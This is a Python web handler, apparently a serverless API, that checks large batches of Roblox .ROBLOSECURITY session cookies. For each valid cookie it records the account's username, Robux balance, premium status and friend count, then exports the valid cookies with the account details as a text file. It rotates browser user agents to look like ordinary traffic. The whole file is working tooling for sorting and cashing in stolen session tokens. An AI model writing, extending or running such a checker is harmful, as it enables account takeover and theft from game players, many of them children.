from http.server import BaseHTTPRequestHandler
import json, requests, time, threading, random
from datetime import datetime, timezone
import os

checker_state = {
    'is_checking': False,
    'current_thread': None,
    'results': [],
    'live_data': {
        'status': 'idle',
        'total_checked': 0,
        'valid': 0,
        'invalid': 0,
        'robux': 0,
        'premium': 0,
        'friends': 0,
        'progress': 0,
        'current': 0,
        'total': 0,
        'start_time': None
    }
}

class handler(BaseHTTPRequestHandler):
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
        self.end_headers()
    
    def do_GET(self):
        if self.path == '/api/check' or self.path == '/api/check?action=status':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            response = {
                'status': checker_state['live_data']['status'],
                'is_checking': checker_state['is_checking'],
                'stats': checker_state['live_data'],
                'time': datetime.now(timezone.utc).isoformat()
            }
            
            self.wfile.write(json.dumps(response).encode())
            return
        
        elif self.path == '/api/check?action=results':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            self.wfile.write(json.dumps(checker_state['results'][-100:]).encode())
            return
        
        elif self.path == '/api/check?action=logs':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            valid_cookies = []
            for result in checker_state['results']:
                if result['status'] == 'valid':
                    valid_cookies.append({
                        'cookie_id': result['cookie_id'],
                        'username': result['username'],
                        'user_id': result['user_id'],
                        'display_name': result['display_name'],
                        'robux': result.get('robux', 0),
                        'premium': result.get('premium', False),
                        'friends': result.get('friends_count', 0),
                        'created_date': result.get('created_date', ''),
                        'timestamp': result['timestamp']
                    })
            
            response = {
                'total_results': len(checker_state['results']),
                'valid_count': len(valid_cookies),
                'invalid_count': len(checker_state['results']) - len(valid_cookies),
                'total_robux': sum([r.get('robux', 0) for r in checker_state['results'] if r['status'] == 'valid']),
                'valid_cookies': valid_cookies,
                'all_logs': checker_state['results'][-50:]
            }
            
            self.wfile.write(json.dumps(response).encode())
            return
            
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)
            
            action = data.get('action', '')
            
            if action == 'start':
                cookies = data.get('cookies', [])
                
                if not cookies:
                    raise ValueError("No cookies provided")
                
                if checker_state['is_checking']:
                    raise ValueError("Checker is already running")
                
                checker_state['is_checking'] = True
                checker_state['results'] = []
                checker_state['live_data'] = {
                    'status': 'running',
                    'total_checked': 0,
                    'valid': 0,
                    'invalid': 0,
                    'robux': 0,
                    'premium': 0,
                    'friends': 0,
                    'progress': 0,
                    'current': 1,
                    'total': len(cookies),
                    'start_time': time.time()
                }
                
                thread = threading.Thread(target=check_cookies_batch, args=(cookies,))
                thread.daemon = True
                thread.start()
                checker_state['current_thread'] = thread
                
                response = {
                    'success': True,
                    'message': f'Started checking {len(cookies)} cookies',
                    'total': len(cookies)
                }
                
            elif action == 'stop':
                checker_state['is_checking'] = False
                checker_state['live_data']['status'] = 'stopped'
                
                response = {
                    'success': True,
                    'message': 'Checker stopped'
                }
                
            elif action == 'test':
                cookie = data.get('cookie', '')
                if not cookie:
                    raise ValueError("No cookie provided")
                
                result = check_single_cookie(cookie, 0)
                response = result
                
                checker_state['results'].append(result)
                
                if result['status'] == 'valid':
                    checker_state['live_data']['valid'] += 1
                    checker_state['live_data']['robux'] += result.get('robux', 0)
                    if result.get('premium', False):
                        checker_state['live_data']['premium'] += 1
                    if result.get('friends_count', 0):
                        checker_state['live_data']['friends'] += result.get('friends_count', 0)
                else:
                    checker_state['live_data']['invalid'] += 1
                
                checker_state['live_data']['total_checked'] += 1
                
            elif action == 'clear':
                checker_state['results'] = []
                checker_state['live_data'] = {
                    'status': 'idle',
                    'total_checked': 0,
                    'valid': 0,
                    'invalid': 0,
                    'robux': 0,
                    'premium': 0,
                    'friends': 0,
                    'progress': 0,
                    'current': 0,
                    'total': 0,
                    'start_time': None
                }
                
                response = {
                    'success': True,
                    'message': 'Results cleared'
                }
                
            elif action == 'export':
                valid_cookies = []
                for result in checker_state['results']:
                    if result['status'] == 'valid':
                        valid_cookies.append(result)

                export_data = "# VALID ROBLOX COOKIES EXPORT\n"
                export_data += f"# Generated: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}\n"
                export_data += f"# Total Valid: {len(valid_cookies)}\n"
                export_data += f"# Total Robux: {sum([r.get('robux', 0) for r in valid_cookies])}\n"
                export_data += f"# Total Premium: {len([r for r in valid_cookies if r.get('premium', False)])}\n\n"

                # Add cookies section
                export_data += "=== VALID COOKIES ===\n"
                for i, cookie in enumerate(valid_cookies):
                    export_data += f"{cookie.get('cookie', 'N/A')}\n"
                export_data += "\n"

                # Add account details section
                export_data += "=== ACCOUNT DETAILS ===\n"
                for i, cookie in enumerate(valid_cookies):
                    export_data += f"=== ACCOUNT {i+1} ===\n"
                    export_data += f"Username: {cookie['username']}\n"
                    export_data += f"Display Name: {cookie['display_name']}\n"
                    export_data += f"User ID: {cookie['user_id']}\n"
                    export_data += f"Robux: {cookie.get('robux', 0)}\n"
                    export_data += f"Premium: {'Yes' if cookie.get('premium', False) else 'No'}\n"
                    export_data += f"Friends: {cookie.get('friends_count', 0)}\n"
                    export_data += f"Created: {cookie.get('created_date', 'Unknown')}\n"
                    export_data += f"Checked: {cookie['timestamp']}\n\n"

                response = {
                    'success': True,
                    'export_data': export_data,
                    'filename': f'valid_cookies_{datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")}.txt'
                }
                
            else:
                raise ValueError("Invalid action")
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
            
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({
                'success': False,
                'error': str(e)
            }).encode())

def check_cookies_batch(cookies):
    for i, cookie in enumerate(cookies):
        if not checker_state['is_checking']:
            break
        
        checker_state['live_data']['current'] = i + 1
        checker_state['live_data']['progress'] = int(((i + 1) / len(cookies)) * 100)
        
        result = check_single_cookie(cookie, i)
        checker_state['results'].append(result)
        
        checker_state['live_data']['total_checked'] += 1
        
        if result['status'] == 'valid':
            checker_state['live_data']['valid'] += 1
            checker_state['live_data']['robux'] += result.get('robux', 0)
            if result.get('premium', False):
                checker_state['live_data']['premium'] += 1
            if result.get('friends_count', 0):
                checker_state['live_data']['friends'] += result.get('friends_count', 0)
        else:
            checker_state['live_data']['invalid'] += 1
        
        if i < len(cookies) - 1 and checker_state['is_checking']:
            time.sleep(0.2)
    
    if checker_state['is_checking']:
        checker_state['is_checking'] = False
        checker_state['live_data']['status'] = 'completed'

def check_single_cookie(cookie, cookie_id=0):
    headers = {
        'User-Agent': get_random_user_agent(),
        'Cookie': f'.ROBLOSECURITY={cookie}',
        'Accept': 'application/json'
    }
    
    result = {
        'cookie_id': cookie_id,
        'cookie': cookie,
        'status': 'error',
        'username': 'Unknown',
        'user_id': 'Unknown',
        'display_name': 'Unknown',
        'premium': False,
        'robux': 0,
        'friends_count': 0,
        'avatar_url': '',
        'created_date': '',
        'error': 'Unknown error',
        'timestamp': datetime.now(timezone.utc).isoformat()
    }
    
    try:
        auth_url = "https://users.roblox.com/v1/users/authenticated"
        response = requests.get(auth_url, headers=headers, timeout=30)
        
        if response.status_code == 200:
            user_data = response.json()
            result['username'] = user_data.get('name', 'Unknown')
            result['user_id'] = str(user_data.get('id', 'Unknown'))
            result['display_name'] = user_data.get('displayName', 'Unknown')
            result['status'] = 'valid'
            result['error'] = None
            
            try:
                user_info_url = f"https://users.roblox.com/v1/users/{result['user_id']}"
                user_info_resp = requests.get(user_info_url, headers=headers, timeout=10)
                if user_info_resp.status_code == 200:
                    user_info = user_info_resp.json()
                    result['created_date'] = user_info.get('created', '')
                    
                    avatar_url = f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={result['user_id']}&size=48x48&format=Png&isCircular=false"
                    avatar_resp = requests.get(avatar_url, timeout=10)
                    if avatar_resp.status_code == 200:
                        avatar_data = avatar_resp.json()
                        if avatar_data.get('data'):
                            result['avatar_url'] = avatar_data['data'][0].get('imageUrl', '')
            except:
                pass
            
            try:
                premium_url = "https://premiumfeatures.roblox.com/v1/users/premium/membership"
                premium_resp = requests.get(premium_url, headers=headers, timeout=10)
                if premium_resp.status_code == 200:
                    result['premium'] = premium_resp.json().get('isPremium', False)
            except:
                pass
            
            try:
                economy_url = "https://economy.roblox.com/v1/user/currency"
                economy_resp = requests.get(economy_url, headers=headers, timeout=10)
                if economy_resp.status_code == 200:
                    result['robux'] = economy_resp.json().get('robux', 0)
            except:
                pass
            
            try:
                friends_url = f"https://friends.roblox.com/v1/users/{result['user_id']}/friends/count"
                friends_resp = requests.get(friends_url, headers=headers, timeout=10)
                if friends_resp.status_code == 200:
                    result['friends_count'] = friends_resp.json().get('count', 0)
            except:
                pass
                
        elif response.status_code == 401:
            result['status'] = 'invalid'
            result['error'] = 'Unauthorized (Cookie expired/invalid)'
        elif response.status_code == 403:
            result['status'] = 'invalid'
            result['error'] = 'Forbidden (Security restriction)'
        elif response.status_code == 429:
            result['status'] = 'rate_limited'
            result['error'] = 'Rate limited by Roblox'
        else:
            result['status'] = 'error'
            result['error'] = f'HTTP {response.status_code}'
            
    except requests.exceptions.Timeout:
        result['status'] = 'error'
        result['error'] = 'Request timeout'
    except requests.exceptions.ConnectionError:
        result['status'] = 'error'
        result['error'] = 'Connection error'
    except Exception as e:
        result['status'] = 'error'
        result['error'] = str(e)
    
    return result

def get_random_user_agent():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ]
    return random.choice(user_agents)